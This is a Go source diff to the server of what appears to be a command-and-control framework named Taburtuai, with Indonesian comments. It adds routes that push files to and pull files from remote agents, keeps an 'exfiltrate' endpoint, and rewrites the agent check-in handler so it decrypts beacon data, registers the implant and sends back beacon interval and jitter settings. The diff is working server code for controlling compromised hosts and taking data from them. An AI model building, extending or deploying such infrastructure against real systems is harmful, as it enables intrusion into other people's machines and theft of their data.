@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"log"
+	"net/http"
 
 	//	"net/http"
 	"os"
@@ -160,9 +161,13 @@ func (s *TaburtuaiServer) setupRoutes() {
 		api.GET("/command/:id", s.getCommand)
 		api.POST("/result", s.submitResult)
 
+		// Download & Upload
+		api.POST("/agent/:id/upload", s.uploadToAgent)
+		api.POST("/agent/:id/download", s.downloadFromAgent)
+
 		// File operations
-		api.POST("/upload", s.uploadFile)
-		api.GET("/download/:id/*filepath", s.downloadFile)
+		// api.POST("/upload", s.uploadFile)
+		// api.GET("/download/:id/*filepath", s.downloadFile)
 		api.POST("/exfiltrate", s.exfiltrateFile)
 
 		// Task scheduling
@@ -338,58 +343,83 @@ func (s *TaburtuaiServer) removeAgent(c *gin.Context) {
 func (s *TaburtuaiServer) agentCheckin(c *gin.Context) {
 	var checkinData map[string]interface{}
 	if err := c.ShouldBindJSON(&checkinData); err != nil {
-		c.JSON(400, APIResponse{
+		c.JSON(http.StatusBadRequest, APIResponse{ // Menggunakan http.StatusBadRequest
 			Success: false,
-			Error:   "Invalid checkin data",
+			Error:   "Invalid checkin data format: " + err.Error(),
 		})
 		return
 	}
 
-	// Check if data is encrypted
-	if encryptedData, ok := checkinData["encrypted"].(string); ok && s.crypto != nil {
-		LogInfo(SYSTEM, "Decrypting checkin data", "")
+	// --- MODIFIKASI UTAMA DI SINI ---
+	// Periksa apakah data terenkripsi menggunakan key "encrypted_payload"
+	if encryptedPayload, ok := checkinData["encrypted_payload"].(string); ok && s.crypto != nil {
+		LogInfo(SYSTEM, "Received checkin data with 'encrypted_payload', decrypting...", "") //
 
-		decrypted, err := s.crypto.DecryptData(encryptedData)
+		decrypted, err := s.crypto.DecryptData(encryptedPayload) //
 		if err != nil {
-			c.JSON(400, APIResponse{
+			LogError(SYSTEM, "Failed to decrypt checkin data: "+err.Error(), "") //
+			c.JSON(http.StatusBadRequest, APIResponse{
 				Success: false,
-				Error:   "Failed to decrypt checkin data",
+				Error:   "Failed to decrypt checkin data: " + err.Error(),
 			})
 			return
 		}
 
-		if err := json.Unmarshal(decrypted, &checkinData); err != nil {
-			c.JSON(400, APIResponse{
+		// Penting: Unmarshal data yang sudah didekripsi ke dalam map baru
+		// atau timpa checkinData agar berisi data agent yang sebenarnya.
+		var decryptedAgentData map[string]interface{}
+		if err := json.Unmarshal(decrypted, &decryptedAgentData); err != nil {
+			LogError(SYSTEM, "Failed to parse decrypted agent data: "+err.Error(), "") //
+			c.JSON(http.StatusBadRequest, APIResponse{
 				Success: false,
-				Error:   "Failed to parse decrypted data",
+				Error:   "Failed to parse decrypted agent data: " + err.Error(),
 			})
 			return
 		}
-
-		LogInfo(SYSTEM, "Checkin data decrypted successfully", "")
+		checkinData = decryptedAgentData                                                    // Gunakan data yang sudah didekripsi untuk proses selanjutnya
+		LogInfo(SYSTEM, "Checkin data decrypted successfully from 'encrypted_payload'", "") //
+	} else if _, encryptedKeyExists := checkinData["encrypted"]; encryptedKeyExists {
+		// Tambahkan log jika key "encrypted" yang lama masih terdeteksi, untuk debugging
+		LogWarn(SYSTEM, "Received checkin data with deprecated 'encrypted' key. Please ensure agent uses 'encrypted_payload'.", "") //
+		// Jika Anda masih ingin mendukung key "encrypted" untuk sementara:
+		// (Logika dekripsi untuk key "encrypted" bisa ditambahkan di sini jika perlu)
+		// Namun, untuk konsistensi, sebaiknya agent diupdate.
 	}
+	// --- AKHIR MODIFIKASI UTAMA ---
 
 	// Register/update agent
-	s.monitor.RegisterAgent(checkinData)
+	// Sekarang checkinData seharusnya berisi map agent info yang sebenarnya (jika terenkripsi dan berhasil didekripsi)
+	// atau map yang dikirim plaintext oleh agent.
+	s.monitor.RegisterAgent(checkinData) //
 
 	agentID := ""
-	if id, ok := checkinData["id"].(string); ok {
+	if id, ok := checkinData["id"].(string); ok { // Ini seharusnya berhasil sekarang
 		agentID = id
+	} else {
+		// Jika ID masih tidak ada setelah potensial dekripsi, ada masalah lain.
+		// Log ini, meskipun RegisterAgent juga akan melakukan validasi.
+		LogError(SYSTEM, "Agent ID missing or not a string in checkinData after potential decryption.", "") //
 	}
 
-	LogAgentActivity(agentID, "checkin", c.ClientIP())
+	LogAgentActivity(agentID, "checkin", c.ClientIP()) //
 
 	// Return any pending commands or config updates
+	// Server dapat mengirimkan konfigurasi atau perintah awal di sini jika perlu
 	response := map[string]interface{}{
 		"status": "ok",
-		"config": map[string]interface{}{
-			"interval": 30,
-			"jitter":   0.3,
+		"config": map[string]interface{}{ // Contoh konfigurasi yang bisa dikirim ke agent
+			"interval": s.config.AgentTimeout.Seconds() / 10, // Contoh: beacon interval
+			"jitter":   0.3,                                  // Contoh: jitter
 		},
+		// "commands": []interface{}{}, // Bisa juga langsung mengirim perintah awal
 	}
 
-	c.JSON(200, APIResponse{
+	// Pertimbangkan untuk mengenkripsi respons ini jika agent mengharapkannya
+	// (Saat ini agent belum mengharapkan respons checkin terenkripsi)
+
+	c.JSON(http.StatusOK, APIResponse{ // Menggunakan http.StatusOK
 		Success: true,
+		Message: "Checkin successful", // Tambahkan pesan sukses
 		Data:    response,
 	})
 }
